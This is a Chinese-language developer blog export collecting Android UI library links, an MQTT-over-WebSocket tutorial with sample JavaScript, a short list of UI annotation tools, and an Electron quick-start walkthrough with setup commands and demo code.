<h2 id="IndicatorSeekBar"><a href="#IndicatorSeekBar" class="headerlink" title="IndicatorSeekBar"></a>IndicatorSeekBar</h2><p><a href="https://github.com/warkiz/IndicatorSeekBar" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/warkiz/IndicatorSeekBar/master/gif/discrete_1.gif" width="180" align="center"></p>
<h2 id="MusicAnimLine"><a href="#MusicAnimLine" class="headerlink" title="MusicAnimLine"></a>MusicAnimLine</h2><p><a href="https://github.com/limuyang2/MusicAnimLine" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/limuyang2/MusicAnimLine/blob/master/gif/pic.gif" width="180" align="center"></p>
<h2 id="MediumClap-Android"><a href="#MediumClap-Android" class="headerlink" title="MediumClap-Android"></a>MediumClap-Android</h2><p><a href="https://github.com/wajahatkarim3/MediumClap-Android" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/wajahatkarim3/MediumClap-Android/master/art/demo_2.gif" width="180" align="center"></p>
<h2 id="WaveView"><a href="#WaveView" class="headerlink" title="WaveView"></a>WaveView</h2><p><a href="https://github.com/baixxx/WaveView" target="_blank" rel="noopener">Github</a></p>
<p><img src="https://github.com/baixxx/WaveView/blob/master/resource/waveview.gif" width="180" align="center"></p>
<h2 id="ShadowImageView可以根据图片内容变阴影颜色，更加细腻的阴影效果"><a href="#ShadowImageView可以根据图片内容变阴影颜色，更加细腻的阴影效果" class="headerlink" title="ShadowImageView可以根据图片内容变阴影颜色，更加细腻的阴影效果"></a>ShadowImageView可以根据图片内容变阴影颜色，更加细腻的阴影效果</h2><p><a href="https://github.com/yingLanNull/ShadowImageView" target="_blank" rel="noopener">Github</a></p>
<h2 id="SVGAPlayer-播放-After-Effects-Animate-CC-Flash-动画"><a href="#SVGAPlayer-播放-After-Effects-Animate-CC-Flash-动画" class="headerlink" title="SVGAPlayer 播放 After Effects / Animate CC (Flash) 动画"></a>SVGAPlayer 播放 After Effects / Animate CC (Flash) 动画</h2><p><a href="https://github.com/yyued/SVGAPlayer-Android" target="_blank" rel="noopener">Github</a></p>
<h2 id="Iconfont-阿里巴巴矢量图标库"><a href="#Iconfont-阿里巴巴矢量图标库" class="headerlink" title="Iconfont-阿里巴巴矢量图标库"></a>Iconfont-阿里巴巴矢量图标库</h2><p><a href="http://www.iconfont.cn" target="_blank" rel="noopener">官网</a><br>需要登录(可以用微博)，可以下载SVG和PNG格式。</p>
<h2 id="开源Icon-MaterialDesign"><a href="#开源Icon-MaterialDesign" class="headerlink" title="开源Icon MaterialDesign"></a>开源Icon MaterialDesign</h2><p>支持Android(Vector/SVG,官网选中图标右键可以直接看Vector)，Web(css字体)，Windows(字体)，<br><a href="https://materialdesignicons.com/" target="_blank" rel="noopener">官网</a><br><a href="https://github.com/templarian/MaterialDesign/" target="_blank" rel="noopener">Github</a><br><img src="https://materialdesignicons.com/images/banner.svg" alt><br><img src="http://i.imgur.com/zKuXEkR.png" alt></p>
<h2 id="InfiniteCycleViewPager"><a href="#InfiniteCycleViewPager" class="headerlink" title="InfiniteCycleViewPager"></a>InfiniteCycleViewPager</h2><p><a href="https://github.com/Devlight/InfiniteCycleViewPager" target="_blank" rel="noopener">Github</a><br><img src="/images/github/InfiniteCycleViewPager.gif" width="180" align="center"></p>
<h2 id="QMUI-Android"><a href="#QMUI-Android" class="headerlink" title="QMUI_Android"></a>QMUI_Android</h2><p><a href="http://qmuiteam.com/android/documents/" target="_blank" rel="noopener">文档</a><br><a href="https://github.com/QMUI/QMUI_Android" target="_blank" rel="noopener">Github</a></p>
<p><code>package com.qmuiteam.qmui.util</code> 里面有很多实用的工具类，如状态栏相关的工具类：QMUIStatusBarHelper</p>
<h2 id="Vorolay"><a href="#Vorolay" class="headerlink" title="Vorolay"></a>Vorolay</h2><p><a href="https://github.com/Quatja/Vorolay" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/Quatja/Vorolay/raw/master/Screenshots/screenshot_2.png" width="180" align="center"><br><img src="https://github.com/Quatja/Vorolay/raw/master/Screenshots/screenshot_4.png" width="180" align="center"></p>
<h2 id="FlabbyListView"><a href="#FlabbyListView" class="headerlink" title="FlabbyListView"></a>FlabbyListView</h2><p><a href="https://github.com/jpardogo/FlabbyListView" target="_blank" rel="noopener">Github</a><br><img src="http://i.imgur.com/wfWGrBS.gif](http://i.imgur.com/wfWGrBS.gif" width="180" align="center"></p>
<h2 id="Ferris-Wheel动画"><a href="#Ferris-Wheel动画" class="headerlink" title="Ferris-Wheel动画"></a>Ferris-Wheel动画</h2><p><a href="https://github.com/iglaweb/Ferris-Wheel" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/iglaweb/Ferris-Wheel/raw/master/art/preview_demo.gif" width="180" align="center"></p>
<h2 id="在空间中绘制随机飞行粒子形成星座"><a href="#在空间中绘制随机飞行粒子形成星座" class="headerlink" title="在空间中绘制随机飞行粒子形成星座"></a>在空间中绘制随机飞行粒子形成星座</h2><p><a href="https://github.com/Doctoror/ParticlesDrawable" target="_blank" rel="noopener">Github</a></p>
<p><img src="https://github.com/Doctoror/ParticlesDrawable/raw/master/screenshots/demo.gif?raw=true" alt></p>
<h2 id="md编辑器"><a href="#md编辑器" class="headerlink" title="md编辑器"></a>md编辑器</h2><p><a href="https://github.com/pandao/editor.md" target="_blank" rel="noopener">Github</a></p>
<h2 id="md编译和解析"><a href="#md编译和解析" class="headerlink" title="md编译和解析"></a>md编译和解析</h2><p><a href="https://github.com/markedjs/marked" target="_blank" rel="noopener">Github</a></p>
<p>##将文本转换为UML序列图<br><a href="https://bramp.github.io/js-sequence-diagrams/" target="_blank" rel="noopener">Github</a></p>
<h2 id="AnimatedTabLayout"><a href="#AnimatedTabLayout" class="headerlink" title="AnimatedTabLayout"></a>AnimatedTabLayout</h2><p><a href="https://github.com/iammert/AnimatedTabLayout" target="_blank" rel="noopener">Github</a><br><img src="https://raw.githubusercontent.com/iammert/AnimatedTabLayout/master/art/gf.gif" width="180" align="center"></p>
<h2 id="Fragmentation"><a href="#Fragmentation" class="headerlink" title="Fragmentation"></a>Fragmentation</h2><p>为”单Activity ＋ 多Fragment”,”多模块Activity + 多Fragment”架构而生，简化开发，轻松解决动画、嵌套、事务相关等问题。<br><a href="https://github.com/YoKeyword/Fragmentation/blob/master/README_CN.md" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/YoKeyword/Fragmentation/raw/master/gif/demo3.gif" width="180" align="center"></p>
<h2 id="Cosin（loading-view）"><a href="#Cosin（loading-view）" class="headerlink" title="Cosin（loading view）"></a>Cosin（loading view）</h2><p><a href="https://github.com/NikitaGordia/Cosin" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/NikitaGordia/Cosin/raw/master/github/1.gif" width="180" align="center"></p>
<h2 id="AndPermission"><a href="#AndPermission" class="headerlink" title="AndPermission"></a>AndPermission</h2><p><a href="https://github.com/yanzhenjie/AndPermission" target="_blank" rel="noopener">Github</a><br>Android权限申请管理库</p>
<h2 id="SeekCircle"><a href="#SeekCircle" class="headerlink" title="SeekCircle"></a>SeekCircle</h2><p><a href="https://github.com/Necat0r/SeekCircle" target="_blank" rel="noopener">Github</a><br><img src="https://raw.github.com/Necat0r/SeekCircle/master/sample/SeekCircle.png" width="180" align="center"></p>
<h2 id="Custom-Circular-SeekBar"><a href="#Custom-Circular-SeekBar" class="headerlink" title="Custom Circular SeekBar"></a>Custom Circular SeekBar</h2><p><a href="https://github.com/tankery/CircularSeekBar" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/tankery/CircularSeekBar/blob/master/art/capture.jpg" width="180" align="center"></p>
<h2 id="TimeRuler-时间轴、时间刻度尺"><a href="#TimeRuler-时间轴、时间刻度尺" class="headerlink" title="TimeRuler 时间轴、时间刻度尺"></a>TimeRuler 时间轴、时间刻度尺</h2><p><a href="https://github.com/huangdali/RulerView" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/huangdali/TimeRuler/raw/master/timerulers.gif" width="180" align="center"></p>
<h2 id="Equalizer-for-Android"><a href="#Equalizer-for-Android" class="headerlink" title="Equalizer for Android"></a>Equalizer for Android</h2><p><a href="https://github.com/HugoGresse/AndroidVuMeter" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/HugoGresse/AndroidVuMeter/raw/master/demo.gif" width="180" align="center"></p>
<h2 id="FastBootWeixin-微信公众号快速开发框架"><a href="#FastBootWeixin-微信公众号快速开发框架" class="headerlink" title="FastBootWeixin 微信公众号快速开发框架"></a>FastBootWeixin 微信公众号快速开发框架</h2><p>基于SpringBoot的微信公众号快速开发框架，注解方式处理全部逻辑<br><a href="https://github.com/FastBootWeixin/FastBootWeixin" target="_blank" rel="noopener">Github</a></p>
<h2 id="一款万能遥控器的交互效果"><a href="#一款万能遥控器的交互效果" class="headerlink" title="一款万能遥控器的交互效果"></a>一款万能遥控器的交互效果</h2><p><a href="https://github.com/simplezhli/RemoteControlView" target="_blank" rel="noopener">Github</a><br><img src="https://github.com/simplezhli/RemoteControlView/raw/master/preview/preview1.gif" width="240" align="center"></p>
<h2 id="Android-毛玻璃效果"><a href="#Android-毛玻璃效果" class="headerlink" title="Android 毛玻璃效果"></a>Android 毛玻璃效果</h2><h5 id="Github-Blurry"><a href="#Github-Blurry" class="headerlink" title="Github Blurry"></a><a href="https://github.com/wasabeef/Blurry" target="_blank" rel="noopener">Github Blurry</a></h5><p>Blurry is an easy blur library for Android.</p>
<p><img src="https://raw.githubusercontent.com/wasabeef/Blurry/master/art/blurry.gif" width="180" align="center"></p>
<h5 id="Github-BlurKit"><a href="#Github-BlurKit" class="headerlink" title="Github BlurKit"></a><a href="https://github.com/wonderkiln/BlurKit-Android" target="_blank" rel="noopener">Github BlurKit</a></h5><pre><code>（目前版本只能在Activity使用，不支持Fragment和Dialog等）模糊图片，提供高斯模糊的遮罩（BlurLayout），随着遮罩下面的内容的变化，高斯模糊效果也会随之改变。[参考](https://juejin.im/post/5a7fec225188257a865d6c30),最新版本为`compile &apos;com.flurgle:blurkit:1.1.1&apos;`，readme上没有更新。
</code></pre><p><img src="https://github.com/wonderkiln/BlurKit-Android/raw/master/.repo/demo.gif" width="180" align="center"></p>
<h5 id="Github-Dali"><a href="#Github-Dali" class="headerlink" title="Github Dali"></a><a href="https://github.com/patrickfav/Dali" target="_blank" rel="noopener">Github Dali</a></h5><pre><code>需要Java8，模糊图片和View（获取View的Bitmap在处理为图像），可以自动刷新模糊。
</code></pre><p><img src="https://github.com/patrickfav/Dali/blob/master/misc/viewpager_anim.gif?raw=true" width="180" align="center"></p>
<h5 id="Github-Gaussian"><a href="#Github-Gaussian" class="headerlink" title="Github Gaussian"></a><a href="https://github.com/jrvansuita/GaussianBlur" target="_blank" rel="noopener">Github Gaussian</a></h5><pre><code>只有模糊图片。
</code></pre><p><img src="https://github.com/jrvansuita/GaussianBlur/raw/master/images/mockups/allosaurus_nexus6p-portrait.png" width="180" align="center"></p>
<h5 id="Github-BlurDialogFragment"><a href="#Github-BlurDialogFragment" class="headerlink" title="Github BlurDialogFragment"></a><a href="https://github.com/tvbarthel/BlurDialogFragment" target="_blank" rel="noopener">Github BlurDialogFragment</a></h5><pre><code>处理了整个DialogFragment，适用于模糊整个Fragment。原理就是获取Fragment的Activity的View Bitmap，再处理为模糊。其他的库也差不多这个思想。
</code></pre><p><img src="https://github.com/tvbarthel/BlurDialogFragment/raw/master/static/action_bar_blur.png" width="180" align="center"></p>
<p>…</p>
]]></content>
      <categories>
        <category>Github</category>
      </categories>
      <tags>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title>Html5使用MQTT</title>
    <url>/%E5%89%8D%E7%AB%AF/Html5%E4%BD%BF%E7%94%A8MQTT/</url>
    <content><![CDATA[<p>测试工具：<br>MQTTLens，MQTTBox</p>
<p>测试服务地址：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. mosquitto</span><br><span class="line">mqtt://test.mosquitto.org</span><br><span class="line">ws://test.mosquitto.org:8080/mqtt (没连上)</span><br><span class="line">测试页面：http://test.mosquitto.org/ws.html</span><br><span class="line"></span><br><span class="line">2. eclipse</span><br><span class="line">tcp://iot.eclipse.org</span><br><span class="line">ws://iot.eclipse.org:80/ws</span><br></pre></td></tr></table></figure></p>
<p>MQTT Client 比较多，各种语言都有开源项目，基本都是基于TCP/IP的，如Java/OC/Swift/nodejs/C/C++等。</p>
<p><a href="http://www.jianshu.com/p/1f8467093d7f#" target="_blank" rel="noopener">H5上的js也可以使用MQTT，只不过是基于WebSocket，用法和其他语言的有一点点区别。</a></p>
<p><a href="https://github.com/mqttjs" target="_blank" rel="noopener">MQTT.js</a> 是一个开源项目，支持nodejs和Browser js ，这里对比一下nodejs和Browser js的用法：</p>
<p><code>注：nodejs是运行在webserver的js，Browser js意思是运行在浏览器上的js，也就是H5用到的js</code><br><code>注：目前项目方已经提供 CDN，不需要自己打包https://unpkg.com/mqtt/dist/mqtt.min.js</code> </p>
<h3 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var mqtt    = require(&apos;mqtt&apos;);</span><br><span class="line">var client  = mqtt.connect(&apos;mqtt://test.mosquitto.org&apos;);</span><br><span class="line"></span><br><span class="line">client.on(&apos;connect&apos;, function () &#123;</span><br><span class="line">  client.subscribe(&apos;presence&apos;);</span><br><span class="line">  client.publish(&apos;presence&apos;, &apos;Hello mqtt&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">client.on(&apos;message&apos;, function (topic, message) &#123;</span><br><span class="line">  // message is Buffer</span><br><span class="line">  console.log(message.toString());</span><br><span class="line">  client.end();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="Browser-js"><a href="#Browser-js" class="headerlink" title="Browser js"></a>Browser js</h3><p>首先要通过webpack 把运行在nodejs上的mqtt.js打包为 <code>browserMqtt.js</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;test Ws mqtt.js&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script src=&quot;./browserMqtt.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">      var client = mqtt.connect(); // you add a ws:// url here</span><br><span class="line">      client.subscribe(&quot;mqtt/demo&quot;);</span><br><span class="line"></span><br><span class="line">      client.on(&quot;message&quot;, function(topic, payload) &#123;</span><br><span class="line">        alert([topic, payload].join(&quot;: &quot;));</span><br><span class="line">        client.end();</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      client.publish(&quot;mqtt/demo&quot;, &quot;hello world!&quot;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>MQTT.js的示例只是说明<code>you add a ws:// url here</code>，但是没有给出url的地址，H5上的地址格式有一点点区别，以host=192.168.1.88，port=8083为例：</p>
<h5 id="示例中的写法："><a href="#示例中的写法：" class="headerlink" title="示例中的写法："></a>示例中的写法：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var client = mqtt.connect(&apos;ws://192.168.1.88:8083&apos;); </span><br><span class="line">client.subscribe(&quot;mqtt/demo&quot;);</span><br></pre></td></tr></table></figure>
<p><code>这种写法subscribe的topic是以 &#39;mqtt/&#39; 开头的。</code></p>
<h5 id="另外一种写法"><a href="#另外一种写法" class="headerlink" title="另外一种写法"></a>另外一种写法</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var client = mqtt.connect(&apos;ws://192.168.1.88:8083/mqtt&apos;); </span><br><span class="line"></span><br><span class="line">&apos;ws://&apos; + &apos;HOST&apos; + &apos;PORT&apos; + &apos;mqtt&apos;</span><br><span class="line"></span><br><span class="line">client.subscribe(&quot;demo&quot;);</span><br></pre></td></tr></table></figure>
<p><code>注意：这里面有两个关键字ws和mqtt</code></p>
<p>MQTT的默认端口是1883，几乎是一个标准端口，但是websocket都不太一样，比如：</p>
<ul>
<li><a href="http://emqtt.com" target="_blank" rel="noopener">emqtt</a>， websocket默认的端口是8083。</li>
<li><a href="http://mosquitto.org" target="_blank" rel="noopener">mosquitto</a> ，websocket默认的端口是9001，但是mosquitto 默认是不开启websocket，你要配置一下，或者安装相关的lib，这要看具体版本而定。<a href="http://www.jianshu.com/p/949e2e6a437c" target="_blank" rel="noopener">Ubuntu mosquitto-1.4.5支持Websocket</a></li>
</ul>
<h3 id="设置连接用户名密码"><a href="#设置连接用户名密码" class="headerlink" title="设置连接用户名密码"></a>设置连接用户名密码</h3><p>在连接的方法传入参数，类似的还有clientid等参数<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var client = mqtt.connect(host,&#123;</span><br><span class="line">username:&quot;hellouser&quot;,</span><br><span class="line">password:&quot;hellopasswd&quot;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<h3 id="支持微信小程序"><a href="#支持微信小程序" class="headerlink" title="支持微信小程序"></a>支持微信小程序</h3><p>Example(js)<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var mqtt = require(&apos;mqtt&apos;)</span><br><span class="line">var client  = mqtt.connect(&apos;wxs://test.mosquitto.org&apos;)</span><br></pre></td></tr></table></figure></p>
<p>Example(ts)<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; connect &#125; from &apos;mqtt&apos;;</span><br><span class="line">const client  = connect(&apos;wxs://test.mosquitto.org&apos;);</span><br></pre></td></tr></table></figure></p>
<h3 id="一个完整的Html5-Client"><a href="#一个完整的Html5-Client" class="headerlink" title="一个完整的Html5 Client"></a>一个完整的Html5 Client</h3><p><a href="https://github.com/kevinvane/html5MQTTDemo" target="_blank" rel="noopener"> github 传送门</a></p>
<p><img src="/images/前端/Html使用MQTT预览.png" alt="预览.png"></p>
<p>注：项目更新了很多，文章没有及时更新，建议看<a href="https://github.com/mqttjs/MQTT.js/blob/master/README.md" target="_blank" rel="noopener">https://github.com/mqttjs/MQTT.js/blob/master/README.md</a></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
  </entry>
  <entry>
    <title>UI标注和切图</title>
    <url>/%E5%89%8D%E7%AB%AF/UI%E6%A0%87%E6%B3%A8%E5%92%8C%E5%88%87%E5%9B%BE/</url>
    <content><![CDATA[<h2 id="标你妹"><a href="#标你妹" class="headerlink" title="标你妹"></a>标你妹</h2><p><a href="http://www.biaonimeia.com" target="_blank" rel="noopener">地址</a><br>在线，自动生成标注，上传psd自动生成标注。</p>
<h2 id="蓝湖"><a href="#蓝湖" class="headerlink" title="蓝湖"></a>蓝湖</h2><p><a href="https://www.lanhuapp.com/" target="_blank" rel="noopener">地址</a><br>在线，自动生成标注/切图，还有原型制作/逻辑连线，支持Sketch 和 Photoshop 设计图，通过插件上传即可实现自动标注。</p>
]]></content>
  </entry>
  <entry>
    <title>Electron初步尝试</title>
    <url>/%E5%89%8D%E7%AB%AF/Electron%E5%88%9D%E6%AD%A5%E5%B0%9D%E8%AF%95/</url>
    <content><![CDATA[<blockquote>
<p>按照官网的 <a href="https://www.electronjs.org/zh/docs/latest/tutorial/quick-start" target="_blank" rel="noopener">【Quick Start】</a> 教程做一遍</p>
</blockquote>
<h2 id="一、创建工程"><a href="#一、创建工程" class="headerlink" title="一、创建工程"></a>一、创建工程</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mkdir electron-app</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> electron-app/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> yarn init 或者 npm init</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls</span></span><br><span class="line">package.json</span><br><span class="line"><span class="meta">$</span><span class="bash"> cat package.json</span></span><br><span class="line">&#123;</span><br><span class="line">  "name": "electron-demo",</span><br><span class="line">  "version": "1.0.0",</span><br><span class="line">  "description": "this is demo",</span><br><span class="line">  "main": "index.js",</span><br><span class="line">  "author": "demo",</span><br><span class="line">  "license": "MIT"</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装electron开发依赖</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> yarn --registry=https://registry.npm.taobao.org add --dev electron</span></span><br><span class="line">或者</span><br><span class="line"><span class="meta">$</span><span class="bash"> npm --registry=https://registry.npm.taobao.org install --save-dev electron</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls</span></span><br><span class="line">node_modules/  package.json  yarn.lock</span><br><span class="line"><span class="meta">$</span><span class="bash"> cat package.json</span></span><br><span class="line">&#123;</span><br><span class="line">  "name": "electron-demo",</span><br><span class="line">  "version": "1.0.0",</span><br><span class="line">  "description": "this is demo",</span><br><span class="line">  "main": "index.js",</span><br><span class="line">  "author": "demo",</span><br><span class="line">  "license": "MIT",</span><br><span class="line">  "devDependencies": &#123;</span><br><span class="line">    "electron": "^16.0.6"</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="二、增加命令"><a href="#二、增加命令" class="headerlink" title="二、增加命令"></a>二、增加命令</h2><p>package.json 增加一条 start 命令<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"electron-demo"</span>,</span><br><span class="line">  <span class="attr">"version"</span>: <span class="string">"1.0.0"</span>,</span><br><span class="line">  <span class="attr">"description"</span>: <span class="string">"this is demo"</span>,</span><br><span class="line">  <span class="attr">"main"</span>: <span class="string">"index.js"</span>,</span><br><span class="line">  <span class="attr">"author"</span>: <span class="string">"demo"</span>,</span><br><span class="line">  <span class="attr">"license"</span>: <span class="string">"MIT"</span>,</span><br><span class="line">  <span class="attr">"devDependencies"</span>: &#123;</span><br><span class="line">    <span class="attr">"electron"</span>: <span class="string">"^16.0.6"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"scripts"</span>: &#123;</span><br><span class="line">    <span class="attr">"start"</span>: <span class="string">"electron ."</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="三、Demo代码"><a href="#三、Demo代码" class="headerlink" title="三、Demo代码"></a>三、Demo代码</h2><p>index.html<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"script-src 'self' </span></span></span><br><span class="line"><span class="tag"><span class="string">    'unsafe-inline';"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        We are using Node.js <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"node-version"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>,</span><br><span class="line">        Chromium <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"chrome-version"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>,</span><br><span class="line">        and Electron <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"electron-version"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>.</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 您也可以此进程中运行其他文件 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;script src="./renderer.js"&gt;&lt;/script&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>index.js<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 控制应用生命周期和创建原生浏览器窗口的模组</span></span><br><span class="line"><span class="keyword">const</span> &#123; app, BrowserWindow &#125; = <span class="built_in">require</span>(<span class="string">'electron'</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createWindow</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> win = <span class="keyword">new</span> BrowserWindow(&#123;</span><br><span class="line">    width: <span class="number">800</span>,</span><br><span class="line">    height: <span class="number">600</span>,</span><br><span class="line">    webPreferences: &#123;</span><br><span class="line">      preload: path.join(__dirname, <span class="string">'preload.js'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  win.loadFile(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 打开开发工具</span></span><br><span class="line">  <span class="comment">// mainWindow.webContents.openDevTools()</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这段程序将会在 Electron 结束初始化</span></span><br><span class="line"><span class="comment">// 和创建浏览器窗口的时候调用</span></span><br><span class="line"><span class="comment">// 部分 API 在 ready 事件触发后才能使用。</span></span><br><span class="line">app.whenReady().then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  createWindow()</span><br><span class="line"></span><br><span class="line">  app.on(<span class="string">'activate'</span>, () =&gt; &#123;</span><br><span class="line">    <span class="comment">// 通常在 macOS 上，当点击 dock 中的应用程序图标时，如果没有其他</span></span><br><span class="line">    <span class="comment">// 打开的窗口，那么程序会重新创建一个窗口。</span></span><br><span class="line">    <span class="keyword">if</span> (BrowserWindow.getAllWindows().length === <span class="number">0</span>) &#123;</span><br><span class="line">      createWindow()</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 除了 macOS 外，当所有窗口都被关闭的时候退出程序。 因此，通常对程序和它们在</span></span><br><span class="line"><span class="comment">// 任务栏上的图标来说，应当保持活跃状态，直到用户使用 Cmd + Q 退出。</span></span><br><span class="line">app.on(<span class="string">'window-all-closed'</span>, () =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (process.platform !== <span class="string">'darwin'</span>) &#123;</span><br><span class="line">    app.quit()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在这个文件中，你可以包含应用程序剩余的所有部分的代码，</span></span><br><span class="line"><span class="comment">// 也可以拆分成几个文件，然后用 require 导入。</span></span><br></pre></td></tr></table></figure></p>
<p>preload.js<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 所有Node.js API都可以在预加载过程中使用。</span></span><br><span class="line"><span class="comment">// 它拥有与Chrome扩展一样的沙盒。</span></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'DOMContentLoaded'</span>, () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> replaceText = <span class="function">(<span class="params">selector, text</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> element = <span class="built_in">document</span>.getElementById(selector)</span><br><span class="line">      <span class="keyword">if</span> (element) element.innerText = text</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> type <span class="keyword">of</span> [<span class="string">'chrome'</span>, <span class="string">'node'</span>, <span class="string">'electron'</span>]) &#123;</span><br><span class="line">      replaceText(<span class="string">`<span class="subst">$&#123;type&#125;</span>-version`</span>, process.versions[type])</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure></p>
<h2 id="四、启动"><a href="#四、启动" class="headerlink" title="四、启动"></a>四、启动</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> yarn start 或者 npm start</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/前端/electron1.png" alt></p>
<p>占用内存大概67MB<br><img src="/images/前端/electron2.png" alt></p>
<h2 id="五、打包分发"><a href="#五、打包分发" class="headerlink" title="五、打包分发"></a>五、打包分发</h2><p><a href="https://www.electronjs.org/zh/docs/latest/tutorial/application-distribution" target="_blank" rel="noopener">官网介绍</a>可以使用以下工具来分发您的应用程序：</p>
<ul>
<li><a href="https://github.com/electron-userland/electron-forge" target="_blank" rel="noopener">electron-forge</a></li>
<li><a href="https://github.com/electron-userland/electron-builder" target="_blank" rel="noopener">electron-builder</a></li>
<li><a href="https://github.com/electron/electron-packager" target="_blank" rel="noopener">electron-packager</a></li>
</ul>
